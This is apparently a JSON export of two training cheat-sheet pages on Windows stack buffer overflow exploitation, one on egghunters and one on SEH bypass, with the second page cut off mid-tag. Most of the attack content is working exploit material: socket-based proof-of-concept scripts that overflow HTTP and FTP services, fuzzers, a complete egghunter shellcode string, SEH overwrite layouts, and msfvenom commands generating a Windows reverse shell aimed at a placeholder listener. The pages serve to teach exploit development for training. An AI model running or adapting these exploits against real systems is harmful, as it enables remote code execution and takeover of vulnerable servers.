[
{
  "id": "bufferoverflow-egghunting",
  "title": "Buffer Overflow Windows - EGGHUNTER",
  "url": "/bufferoverflow-egghunting",
  "category": "BufferOverflow",
  "keywords": ["BufferOverflow","egghunter",65535,"stack","exploits","sec4us","mona","immunity","badchars","bytearray"],
  "content_html": "<h2 class=\"-three-column\" id=\"getting-started\">GETTING STARTED</h2>\n\n<h3 class=\"-intro\" id=\"introduction\">Introduction</h3>\n\n<p>This is a quick reference to getting started with Buffer Overflow.</p>\n\n<ul>\n  <li><a href=\"https://sec4us.com.br/exploit-development-p1/\" target=\"_blank\">Buffer Overflow Training</a> <em>(learn from scratch show to create your own exploit exploring Buffer Overflow Windows)</em></li>\n  <li><a href=\"https://www.linkedin.com/in/ederluis1973\" target=\"_blank\">Linkedin page</a> <em>(Eder Luis - 0xffff)</em></li>\n  <li><a href=\"https://sec4us.com.br\" target=\"_blank\">PDF Version Soon</a> <em>(https://sec4us.com.br)</em></li>\n</ul>\n\n<h3 id=\"immunity-debugger\">Immunity Debugger</h3>\n\n<p><strong>Install Immunity</strong></p>\n\n<p>download after fill the form: \n<a href=\"https://debugger.immunityinc.com/ID_register.py\"> https://debugger.immunityinc.com/ID_register.py </a></p>\n\n<h3 id=\"configure-monapy-in-immunity-debugger\">Configure Mona.py in Immunity Debugger</h3>\n\n<p><a href=\"https://raw.githubusercontent.com/corelan/mona/master/mona.py\">download https://raw.githubusercontent.com/corelan/mona/master/mona.py</a></p>\n\n<p>put mona.py inside the <strong>/pycommands</strong> immunity directory</p>\n\n<p><strong>Setting a <strong>logs&lt;/strong&gt; directory inside Immunitydebugger</strong></strong></p>\n\n<pre><code class=\"language-bash\">!mona config -set workingfolder c:\\logs\\%p\n</code></pre>\n<ul>\n  <li>it is importart that the logs directory have been created in the windows machine with immunity.</li>\n</ul>\n\n<h2 class=\"-three-column\" id=\"registers\">REGISTERS</h2>\n\n<h3 id=\"what-is-registers-\">What is Registers ?</h3>\n\n<p>Register is a small space used by CPU to store information.</p>\n\n<h3 id=\"registers---32-bits\">Registers - 32 bits</h3>\n\n<table>\n  <thead>\n    <tr>\n      <th>32 bits</th>\n      <th>16 bits</th>\n      <th>8 bits</th>\n      <th> </th>\n    </tr>\n    <tr>\n      <th> </th>\n      <th> </th>\n      <th>High</th>\n      <th>Low</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>eax</td>\n      <td>ax</td>\n      <td>ah</td>\n      <td>al</td>\n    </tr>\n    <tr>\n      <td>ecx</td>\n      <td>ax</td>\n      <td>ch</td>\n      <td>cl</td>\n    </tr>\n    <tr>\n      <td>edx</td>\n      <td>dx</td>\n      <td>dh</td>\n      <td>dl</td>\n    </tr>\n    <tr>\n      <td>ebx</td>\n      <td>bx</td>\n      <td>bh</td>\n      <td>bl</td>\n    </tr>\n    <tr>\n      <td>esp</td>\n      <td>sp</td>\n      <td> </td>\n      <td>spl</td>\n    </tr>\n    <tr>\n      <td><strong>EBP</strong></td>\n      <td>bp</td>\n      <td> </td>\n      <td>bpl</td>\n    </tr>\n    <tr>\n      <td>esi</td>\n      <td>si</td>\n      <td> </td>\n      <td>sil</td>\n    </tr>\n    <tr>\n      <td>edi</td>\n      <td>di</td>\n      <td> </td>\n      <td>dil</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"ip---instruction-pointer\">IP - Instruction Pointer</h3>\n\n<p>Points to next instruction to be executed</p>\n\n<table>\n  <thead>\n    <tr>\n      <th>Register</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>ip</code></td>\n      <td>16 bits</td>\n    </tr>\n    <tr>\n      <td><strong><code>EIP </code></strong></td>\n      <td>32 bits</td>\n    </tr>\n    <tr>\n      <td><code>rip</code></td>\n      <td>64 bits</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"sp---stack-pointer\">SP - Stack Pointer</h3>\n\n<p>Points to top of stack</p>\n\n<table>\n  <thead>\n    <tr>\n      <th>Register</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>sp</code></td>\n      <td>16 bits</td>\n    </tr>\n    <tr>\n      <td><strong><code>ESP</code></strong></td>\n      <td>32 bits</td>\n    </tr>\n    <tr>\n      <td><code>rsp</code></td>\n      <td>64 bits</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2 class=\"-two-column\" id=\"proof-of-concept-poc\">PROOF OF CONCEPT (POC)</h2>\n\n<h3 id=\"example-connection-web-application-poc-poc-testpy\">Example Connection WEB Application POC [poc-test.py]</h3>\n<pre><code class=\"language-python\">#!/usr/bin/python\n\nimport socket\nimport os\nimport sys\n\nhost = \"x.x.x.x\"\nport = 8080\nbuffer = \"A\" * xxx\n\nheader = (\n\"HEAD /\" + buffer + \" HTTP/1.1\\r\\n\"\n\"Host: x.x.x.x:8080\\r\\n\"\n\"User-Agent: SEC4US 0xffff\\r\\n\"\n\"Keep-Alive: 115\\r\\n\"\n\"Connection: keep-alive\\r\\n\\r\\n\")\n\nexpl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nexpl.connect((host,port))\nprint \"Injection %s bytes\" % len(buffer)\nexpl.send(header)\nexpl.close()\n</code></pre>\n\n<h3 id=\"simple-web-fuzzer-with-spike-fuzzerspk\">Simple WEB Fuzzer with SPIKE [fuzzer.spk]</h3>\n<pre><code class=\"language-bash\">s_string(\"HEAD /\");\ns_string_variable(\"poc_value\");\ns_string(\" \");\ns_string(\"HTTP/1.1\\r\\n\");\ns_string(\"Host: x.x.x.x:8080\\r\\n\");\ns_string(\"User-Agent: Eder Luis - SEC4US\\r\\n\");\ns_string(\"Keep-Alive: 115\\r\\n\");\ns_string(\"Connection: Keep-Alive\\r\\n\");\ns_string(\"\\r\\n\\r\\n\");\nsleep(3);\n</code></pre>\n\n<p>running spike in the bash</p>\n\n<pre><code class=\"language-bash\">generic_send_tcp x.x.x.x 8080 fuzzer.spk 0 0\n</code></pre>\n\n<h2 class=\"-two-column\" id=\"badchars\">BADCHARS</h2>\n\n<h3 id=\"ascii-table\">ASCII Table</h3>\n\n<table>\n  <thead>\n    <tr>\n      <th>CHAR</th>\n      <th>DEC</th>\n      <th>OCT</th>\n      <th>HEX</th>\n      <th>Linux</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>(nl)</td>\n      <td>10</td>\n      <td>0012</td>\n      <td>x0a</td>\n      <td>\\n</td>\n    </tr>\n    <tr>\n      <td>(cr)</td>\n      <td>13</td>\n      <td>0015</td>\n      <td>x0d</td>\n      <td>\\r</td>\n    </tr>\n    <tr>\n      <td>A</td>\n      <td>65</td>\n      <td>0101</td>\n      <td>x41</td>\n      <td> </td>\n    </tr>\n    <tr>\n      <td>B</td>\n      <td>66</td>\n      <td>0102</td>\n      <td>x42</td>\n      <td> </td>\n    </tr>\n    <tr>\n      <td>C</td>\n      <td>67</td>\n      <td>0103</td>\n      <td>x43</td>\n      <td> </td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"commom-badchars\">Commom Badchars</h3>\n<p>After see the ascii tables, we have 3 common badchars that are bad for the applications</p>\n\n<pre><code class=\"language-bash\">\\x00 = Null Byte o end of string\n\\x0a = New Line \\n (linux)\n\\x0d = Carriage Return  \\r (linux)\n</code></pre>\n\n<h2 class=\"-two-column\" id=\"buffer-overflow-with-egghunter\">BUFFER OVERFLOW with EGGHUNTER</h2>\n\n<h3 id=\"1---run-fuzzer\">1 - Run Fuzzer</h3>\n<p>Run the fuzzer to discover how many bytes you get a buffer overflow</p>\n<pre><code class=\"language-bash\">./fuzzer.py\n</code></pre>\n\n<h3 id=\"2---run-poc\">2 - Run POC</h3>\n<p>Run the POC to be sure you got a buffer overflow in the stack</p>\n<pre><code class=\"language-bash\">./poc-test.py\n\n</code></pre>\n\n<h3 id=\"3---discover-eip-position-in-the-stack\">3 - Discover EIP Position in the Stack</h3>\n<p>creating a pattern with the bytes discovered by fuzzer</p>\n<pre><code class=\"language-bash\">msf-pattern_create -l xxx\n\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n</code></pre>\n<p>inserting the pattern inside the POC and get the address in the EIP Register (<strong>eipaddress</strong>)</p>\n\n<h3 id=\"4---discover-offset\">4 - Discover OFFSET</h3>\n<p>Discover How Many bytes of the Offset before EIP (yyy)</p>\n\n<p>msf-pattern_offset -q EIPaddress</p>\n\n<pre><code class=\"language-bash\">msf-pattern_offset -q 32674231\n[*] Exact match at offset 965\n</code></pre>\n<p>Example: \noffset = “A” * yyy\noffset = “A” * 965</p>\n\n<h3 id=\"5---make-a-stack-fitting\">5 - Make a Stack Fitting</h3>\n<p>it is time of building the exploit. We use in this example a space of the payload with 400 bytes in the ESP</p>\n\n<p>Example:</p>\n<pre><code class=\"language-bash\">offset = \"A\" * yyy\neip = \"BBBB\"\nesp = \"C\" * 400\nbuffer = offset + eip + esp\n</code></pre>\n<h3 id=\"6---search-jmp-esp\">6 - Search JMP ESP</h3>\n\n<p>inside immunity debugger</p>\n\n<p><strong>!mona jmp -r esp -n</strong>\nchoose a DLL with less protection (SEH, ASLR, etc)</p>\n\n<p>Example:</p>\n<pre><code class=\"language-bash\">offset = \"A\" * yyy\neip = jmpesp-address\nesp = \"C\" * 400\nbuffer = offset + eip + esp\n</code></pre>\n\n<h3 id=\"7---reduced-space-to-shellcode\">7 - Reduced Space to Shellcode</h3>\n<p>Calculating a space to put my shellcode</p>\n\n<p>NN = address-of-ESP - address-of-offset-where-i-want-to-go\n           CCCCC     -        AAAA</p>\n\n<pre><code class=\"language-python\">python\nhex(0xCCCC - 0xAAAA)\nint(0xJJ)\n</code></pre>\n\n<h3 id=\"8---negative-jump\">8 - Negative JUMP</h3>\n<p>How there is no space in the stack to put the payload, its necessary to do a negative jump to offset position to put a egghunter code.</p>\n\n<p><strong>msf-nasm_shell</strong></p>\n\n<p>nasm&gt; JMP SHORT -0xJJ\nResult:</p>\n<pre><code class=\"language-bash\">\\xEB\\x??\n</code></pre>\n\n<p><strong>Stack Fitting</strong></p>\n<pre><code class=\"language-bash\">offset = \"A\" * yyy\neip = jmpesp-address\nesp = \\xEB\\x??\nbuffer = offset + eip + esp\n</code></pre>\n\n<h3 id=\"9---shellcode-space\">9 - Shellcode Space</h3>\n<p>it is time to discover a new point to fit a shellcode, for example, we can put in User-Agent on the header</p>\n\n<pre><code class=\"language-python\">#!/usr/bin/python\n\nimport socket\nimport os\nimport sys\n\nhost = \"x.x.x.x\"\nport = 8080\n\nshellcode = \"T00WT00W\"\nshellcode += \"C\" * 400\n\noffset = \"A\" * yyy\neip = jmpesp-address\nesp = \\xEB\\x??\nbuffer = offset + eip + esp\n\nheader = (\n\"HEAD /\" + buffer + \" HTTP/1.1\\r\\n\"\n\"Host: x.x.x.x:8080\\r\\n\"\n\"User-Agent: \" + shellcode + \"\\r\\n\"\n\"Keep-Alive: 115\\r\\n\"\n\"Connection: keep-alive\\r\\n\\r\\n\")\n\nexpl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nexpl.connect((host,port))\nprint \"Injection %s bytes\" % len(buffer)\nexpl.send(header)\nexpl.close()\n</code></pre>\n\n<h3 id=\"10---looking-for-shellcode\">10 - Looking For shellcode</h3>\n<p>After run POC.py, analize in the immunity the stack and do mona.py looking for shellcode</p>\n\n<pre><code class=\"language-bash\">!mona find -s T00WT00W\n</code></pre>\n\n<h3 id=\"11---build-egghunter\">11 - Build Egghunter</h3>\n<p>it is very simple to build a egghunter code by mona</p>\n\n<pre><code class=\"language-bash\">!mona egg -t T00W\n</code></pre>\n<p>it is import add nullbytes before and after the egghunter code to analize on the stack</p>\n<pre><code class=\"language-python\">egghunter = \"\\x90\" * 4\negghunter += \"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\"\negghunter += \"\\xef\\xb8\\x54\\x30\\x30\\x57\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7\"\negghunter += \"\\x90\" * 4\n</code></pre>\n\n<h3 id=\"12---build-exploit-with-egghunter\">12 - Build exploit with egghunter</h3>\n<p>it is very simple to build a egghunter code by mona</p>\n\n<pre><code class=\"language-bash\">...\nshellcode = \"T00WT00W\"\nshellcode += \"C\" * 400\n\negghunter = \"\\x90\" * 4\negghunter += \"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\"\negghunter += \"\\xef\\xb8\\x54\\x30\\x30\\x57\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7\"\negghunter += \"\\x90\" * 4\n\n\noffset = \"A\" * (yyy -len(egghunter)) + egghunter\neip = jmpesp-address\nesp = \\xEB\\x??\nbuffer = offset + eip + esp\n...\n</code></pre>\n\n<h3 id=\"13---looking-for-badchars\">13 - Looking For BADCHARS</h3>\n<p>inside immunity debugger</p>\n<pre><code class=\"language-bash\">!mona bytearray\n!mona bytearray -cpb \"\\x00\\x0a\\x0d\"\n</code></pre>\n<p>get the address of the start of the bytearray in the stack (ZZZZZZZZ)</p>\n<pre><code class=\"language-bash\">!mona compare -f c:\\logs\\appname\\bytearray.bin -a ZZZZZZZZ\n</code></pre>\n<h3 id=\"14---build-a-payload-reverseshell\">14 - Build a Payload (reverseshell)</h3>\n<p>using the msfvenom to build a payload of the reverse shell</p>\n<pre><code class=\"language-bash\">msfvenom -p windows/shell_reverse_tcp lhost=x.x.x.x lport=xxx -b \"\\x00\\x0a\\x0d\\x.......\" -a x86 --platform win -v esp -f python\n</code></pre>\n\n<h2 class=\"-one-column\" id=\"also-see\">Also see</h2>\n\n<ul>\n  <li><a href=\"https://www.helviojunior.com.br/category/it/security/criacao-de-exploits/\" target=\"_blank\">Build Exploits Exploring Buffer Overflow - Helvio Junior</a></li>\n  <li><a href=\"https://www.youtube.com/watch?v=wLi-dGphpdg&amp;t=806s\" target=\"_blank\">Video: Understanding Buffer Overflow Concept</a></li>\n  <li><a href=\"https://www.youtube.com/watch?v=oGZ01rvbfwE&amp;t=6s\" target=\"_blank\">Video: How to do a Buffer Overflow</a></li>\n</ul>",
  "intro_html": "",
  "description_html": "",
  "tags": ["Featured"],
  "updated": "2020-07-30"
},{
  "id": "bufferoverflow-seh",
  "title": "Buffer Overflow Bypass SEH",
  "url": "/bufferoverflow-seh",
  "category": "BufferOverflow",
  "keywords": ["BufferOverflow",65535,"SEH","stack","exploits","sec4us","mona","immunity","badchars","bytearray"],
  "content_html": "<h2 class=\"-three-column\" id=\"getting-started\">GETTING STARTED</h2>\n\n<h3 class=\"-intro\" id=\"introduction\">Introduction</h3>\n\n<p>This is a quick reference to getting started with Buffer Overflow.</p>\n\n<ul>\n  <li><a href=\"https://sec4us.com.br/exploit-development-p1/\" target=\"_blank\">Buffer Overflow Training</a> <em>(learn from scratch show to create your own exploit exploring Buffer Overflow Windows)</em></li>\n  <li><a href=\"https://www.linkedin.com/in/ederluis1973\" target=\"_blank\">Linkedin page</a> <em>(Eder Luis - 0xffff)</em></li>\n  <li><a href=\"https://sec4us.com.br\" target=\"_blank\">PDF Version Soon</a> <em>(https://sec4us.com.br)</em></li>\n</ul>\n\n<h3 id=\"immunity-debugger\">Immunity Debugger</h3>\n\n<p><strong>Install Immunity</strong></p>\n\n<p>download after fill the form: \n<a href=\"https://debugger.immunityinc.com/ID_register.py\"> https://debugger.immunityinc.com/ID_register.py </a></p>\n\n<h3 id=\"configure-monapy-in-immunity-debugger\">Configure Mona.py in Immunity Debugger</h3>\n\n<p><a href=\"https://raw.githubusercontent.com/corelan/mona/master/mona.py\">download https://raw.githubusercontent.com/corelan/mona/master/mona.py</a></p>\n\n<p>put mona.py inside the <strong>/pycommands</strong> immunity directory</p>\n\n<p><strong>Setting a <strong>logs&lt;/strong&gt; directory inside Immunitydebugger</strong></strong></p>\n\n<pre><code class=\"language-bash\">!mona config -set workingfolder c:\\logs\\%p\n</code></pre>\n<ul>\n  <li>it is importart that the logs directory have been created in the windows machine with immunity.</li>\n</ul>\n\n<h2 class=\"-three-column\" id=\"registers\">REGISTERS</h2>\n\n<h3 id=\"what-is-registers-\">What is Registers ?</h3>\n\n<p>Register is a small space used by CPU to store information.</p>\n\n<h3 id=\"registers---32-bits\">Registers - 32 bits</h3>\n\n<table>\n  <thead>\n    <tr>\n      <th>32 bits</th>\n      <th>16 bits</th>\n      <th>8 bits</th>\n      <th> </th>\n    </tr>\n    <tr>\n      <th> </th>\n      <th> </th>\n      <th>High</th>\n      <th>Low</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>eax</td>\n      <td>ax</td>\n      <td>ah</td>\n      <td>al</td>\n    </tr>\n    <tr>\n      <td>ecx</td>\n      <td>ax</td>\n      <td>ch</td>\n      <td>cl</td>\n    </tr>\n    <tr>\n      <td>edx</td>\n      <td>dx</td>\n      <td>dh</td>\n      <td>dl</td>\n    </tr>\n    <tr>\n      <td>ebx</td>\n      <td>bx</td>\n      <td>bh</td>\n      <td>bl</td>\n    </tr>\n    <tr>\n      <td>esp</td>\n      <td>sp</td>\n      <td> </td>\n      <td>spl</td>\n    </tr>\n    <tr>\n      <td><strong>EBP</strong></td>\n      <td>bp</td>\n      <td> </td>\n      <td>bpl</td>\n    </tr>\n    <tr>\n      <td>esi</td>\n      <td>si</td>\n      <td> </td>\n      <td>sil</td>\n    </tr>\n    <tr>\n      <td>edi</td>\n      <td>di</td>\n      <td> </td>\n      <td>dil</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"ip---instruction-pointer\">IP - Instruction Pointer</h3>\n\n<p>Points to next instruction to be executed</p>\n\n<table>\n  <thead>\n    <tr>\n      <th>Register</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>ip</code></td>\n      <td>16 bits</td>\n    </tr>\n    <tr>\n      <td><strong><code>EIP </code></strong></td>\n      <td>32 bits</td>\n    </tr>\n    <tr>\n      <td><code>rip</code></td>\n      <td>64 bits</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"sp---stack-pointer\">SP - Stack Pointer</h3>\n\n<p>Points to top of stack</p>\n\n<table>\n  <thead>\n    <tr>\n      <th>Register</th>\n      <th>Description</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>sp</code></td>\n      <td>16 bits</td>\n    </tr>\n    <tr>\n      <td><strong><code>ESP</code></strong></td>\n      <td>32 bits</td>\n    </tr>\n    <tr>\n      <td><code>rsp</code></td>\n      <td>64 bits</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2 class=\"-two-column\" id=\"proof-of-concept-poc\">PROOF OF CONCEPT (POC)</h2>\n\n<h3 id=\"example-connection-ftp-poc-poc-testpy\">Example Connection FTP POC [poc-test.py]</h3>\n<pre><code class=\"language-python\">#!/usr/bin/python\nimport sys\nimport socket\nimport time\nfrom struct import *\n\nrhost = 'x.x.x.x'\nport = 21\n\nbuffer = \"A\" * 100\nbuffer +='\\r\\n'\ntry:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((rhost, port))\n        print s.recv(2048)\n        s.send('USER 0xffff\\r\\n')\n        print s.recv(2048)\n        s.send('PASS eder@sec4us\\r\\n')\n        print s.recv(2048)\n        s.send('STOR ' + buffer)\n        print s.recv(2048)\n        s.close()\n        print \"Sent Buffer of %s bytes\" %len(buffer)\nexcept socket.error as error:\n        s.close()\n        print error\n</code></pre>\n\n<h3 id=\"simple-connection-ftp-poc-fuzzer-fuzzerpy\">Simple Connection FTP POC Fuzzer [fuzzer.py]</h3>\n<pre><code class=\"language-python\">#!/usr/bin/python\n\nimport socket, time\n\nremoteip=\"x.x.x.x\"\nport=21\n\nsize=100\nbuffer = \"A\" * size\nwhile True:\n\n    print \"Fuzzing with %s bytes\" % len(buffer)\n    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((remoteip, port))\n    except:\n        print (\"[-] Connection error!\")\n        sys.exit(1)\n\n    print s.recv(1024)\n    print \"Sending username...\"\n    s.send('USER anonymous\\r\\n')\n    print s.recv(1024)\n    print \"Sending pass...\"\n    s.send('PASS 0xffff@sec4us.com.br\\r\\n')\n    print s.recv(1024)\n    s.send('STOR ' + buffer +'\\r\\n')\n    print s.recv(2048)\n    s.close()\n    time.sleep(1)\n    size += 100\n    buffer = \"A\" * size\n    print \"-------------------------\"\n</code></pre>\n\n<h2 class=\"-two-column\" id=\"badchars\">BADCHARS</h2>\n\n<h3 id=\"ascii-table\">ASCII Table</h3>\n\n<table>\n  <thead>\n    <tr>\n      <th>CHAR</th>\n      <th>DEC</th>\n      <th>OCT</th>\n      <th>HEX</th>\n      <th>Linux</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>(nl)</td>\n      <td>10</td>\n      <td>0012</td>\n      <td>x0a</td>\n      <td>\\n</td>\n    </tr>\n    <tr>\n      <td>(cr)</td>\n      <td>13</td>\n      <td>0015</td>\n      <td>x0d</td>\n      <td>\\r</td>\n    </tr>\n    <tr>\n      <td>A</td>\n      <td>65</td>\n      <td>0101</td>\n      <td>x41</td>\n      <td> </td>\n    </tr>\n    <tr>\n      <td>B</td>\n      <td>66</td>\n      <td>0102</td>\n      <td>x42</td>\n      <td> </td>\n    </tr>\n    <tr>\n      <td>C</td>\n      <td>67</td>\n      <td>0103</td>\n      <td>x43</td>\n      <td> </td>\n    </tr>\n  </tbody>\n</table>\n\n<h3 id=\"commom-badchars\">Commom Badchars</h3>\n<p>After see the ascii tables, we have 3 common badchars that are bad for the applications</p>\n\n<pre><code class=\"language-bash\">\\x00 = Null Byte o end of string\n\\x0a = New Line \\n (linux)\n\\x0d = Carriage Return  \\r (linux)\n</code></pre>\n\n<h2 class=\"-two-column\" id=\"struct-exception-handling-seh\">STRUCT EXCEPTION HANDLING (SEH)</h2>\n\n<h3 id=\"1---what-are-exception-handles\">1 - What are Exception Handles</h3>\n<p>An exception handler is a <strong>piece of code</strong> that is written inside an application, with the purpose of dealing with the fact that the application throws an exception to protect itself.</p>\n<pre><code class=\"language-python\">try\n{\n  //run stuff.  If an exception occurs, go to  code\n}\ncatch\n{\n  // run stuff when exception occurs\n}\n</code></pre>\n\n<h3 id=\"2---seh-structure\">2 - SEH Structure</h3>\n<p>This structure ( also called a SEH record) is <strong>8 bytes</strong> and has 2 (4 byte) elements\n<img src=\"https://s.sec4us.com.br/images/corelan_image45.png\" alt=\"SEH Structure\" /></p>\n\n<p>Image Source: <a href=\"https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/\">corelan.be</a></p>\n\n<h2 class=\"-two-column\" id=\"buffer-overflow-bypass-seh---step-by-step\">BUFFER OVERFLOW BYPASS SEH - STEP BY STEP</h2>\n\n<h3 id=\"1---run-fuzzer\">1 - Run Fuzzer</h3>\n<p>Run the fuzzer to discover how many bytes you get a buffer overflow</p>\n<pre><code class=\"language-bash\">./fuzzer.py\n</code></pre>\n\n<h3 id=\"2---run-poc\">2 - Run POC</h3>\n<p>Run the POC to be sure you got a buffer overflow in the stack, but because of the exception we have to <shift>+F9 to jump the exception</shift></p>\n<pre><code class=\"language-bash\">./poc-test.py\n\n</code></pre>\n\n<h3 id=\"3---create-a-pattern\">3 - Create a Pattern</h3>\n<p>creating a pattern with the bytes discovered by fuzzer</p>\n<pre><code class=\"language-bash\">msf-pattern_create -l xxx\n\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n</code></pre>\n\n<h3 id=\"4---discover-seh-position-in-the-stack\">4 - Discover SEH Position in the Stack</h3>\n<p>inserting the pattern inside the POC and get the address of the SEH (** SEHaddress**) inside of the Immunity Debugger</p>\n\n<p><em>shift+F9</em></p>\n<pre><code class=\"language-bash\">!mona findmsp\n</code></pre>\n<p>Example:</p>\n<ul>\n  <li>Exact match at SEH offset 1037</li>\n</ul>\n\n<p>Example:</p>\n<pre><code class=\"language-bash\">offset = \"A\" * yyy\noffset = \"A\" * 1037\n</code></pre>\n\n<h3 id=\"5---make-a-stack-fitting\">5 - Make a Stack Fitting</h3>\n<p>it is time of building the exploit. We use in this example a space of the payload with 400 bytes in the ESP and it was necessary fit with bypass of the SEH</p>\n\n<p>Example:</p>\n<pre><code class=\"language-bash\">offset = \"A\" * yyy\n# jmp short 8 bytes\nseh = \"BBBB\"\n# pop pop ret address\nnextseh = \"CCCC\"\n# shellcode space\nesp = \"D\" * 400\nbuffer = offset + seh + nextseh + esp\n</code></pre>\n<h3 id=\"6---unstacking-8-bytes-with-pop-pop-ret\">6 - Unstacking 8 bytes with (POP POP RET)</h3>\n\n<pre><code class=\"language-bash\">!mona seh -n\n</code></pre>\n<ul>\n  <li>choose a address of the best DLL with less security\nExample:\nkmdtpcm.dll address\n<em>0x1220401E</em></li>\n</ul>\n\n<h3 id=\"7---jump-seh-structure-8bytes\">7 - JUMP SEH STRUCTURE (8bytes)</h3>\n\n<p>it is necessary unstacking 8 bytes because SEH has 8 bytes</p>\n<pre><code class=\"language-bash\">msf-nasm_shell\nnasm&gt; jmp short 08\n</code></pre>\n<p>result:\n\\xeb\\x06</p>\n\n<h3 id=\"8---new-stack-fitting\">8 - New Stack Fitting</h3>\n\n<pre><code class=\"language-bash\"># offset before SEH\noffset = \"A\" * yyy\n# jmp short 8 bytes\nseh = \"\\x90\\x90\\xeb\\x06\"\n# pop pop ret to return to SEH\nnextseh = pack('&lt;L',0x1220401E)\nesp = \"D\" * 400\nbuffer = offset + seh + nextseh + esp\n</code></pre>\n\n<h3 id=\"9---looking-for-badchars\">9 - Looking For BADCHARS</h3>\n\n<p>inside immunity debugger</p>\n<pre><code class=\"language-bash\">!mona bytearray\n!mona bytearray -cpb \"\\x00\\x0a\\x0d\"\n</code></pre>\n<p>put the bytearray in your POC</p>\n\n<pre><code class=\"language-python\">bytearray = (\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0b\\x0c\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\"\n\"\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\"\n\"\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\"\n\"\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\"\n\"\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\"\n\"\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\"\n\"\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\"\n\"\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")\n</code></pre>\n<p>put your bytearray in the POC e run to get in the immunity the address of the start of the bytearray in the stack (ZZZZZZZZ)</p>\n\n<p>Inside Immunity Debugger</p>\n<pre><code class=\"language-bash\">!mona compare -f c:\\logs\\appname\\bytearray.bin -a ZZZZZZZZ\n</code></pre>\n<h3 id=\"10---build-a-payload-reverseshell\">10 - Build a Payload (reverseshell)</h3>\n\n<p>using the msfvenom to build a payload of the reverse shell</p>\n\n<pre><code 